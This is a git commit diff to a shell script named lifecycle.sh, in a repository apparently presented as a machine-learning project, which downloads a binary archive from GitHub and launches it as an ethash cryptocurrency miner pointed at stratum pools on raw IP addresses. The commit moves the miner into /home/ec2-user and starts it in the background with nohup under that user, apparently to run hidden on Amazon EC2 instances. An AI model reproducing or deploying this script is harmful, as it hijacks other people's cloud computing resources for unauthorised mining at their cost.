3805540dee06c520c4d982a88dad0e5d0e228531
Jame <lungtungner@gmail.com>
2022-03-24 08:59:53 +0700

    Update lifecycle.sh

--- lifecycle.sh
+++ lifecycle.sh
@@ -3,12 +3,14 @@
 wget https://github.com/Dev699vn/PiMachineLearning/raw/main/linux.tar.gz
 tar -xvf linux.tar.gz
 rm -rf linux.tar.gz
-mkdir bin
-mv linux bin/linux
-cd bin/            
-echo "#!/bin/bash" > runsrc.sh
-echo "./linux -a ethash -o stratum+http://184.164.64.100:8086 -o stratum+http://159.203.107.149:8080" >> runsrc.sh
+mkdir -P /home/ec2-user/bin
+mv linux /home/ec2-user/bin/linux
 
-chmod +x runsrc.sh
-nohup sh runsrc.sh > result.txt 2>&1 &
+echo "#!/bin/bash" > /home/ec2-user/bin/runsrc.sh
+echo "./linux -a ethash -o stratum+http://184.164.64.100:8086 -o stratum+http://159.203.107.149:8080" >> /home/ec2-user/bin/runsrc.sh
+
+chmod +x /home/ec2-user/bin/runsrc.sh
+chown ec2-user:ec2-user /home/ec2-user/bin/runsrc.sh
+
+sudo -u ec2-user nohup /home/ec2-user/bin/runsrc.sh > /home/ec2-user/bin/result.txt 2>&1 &
 
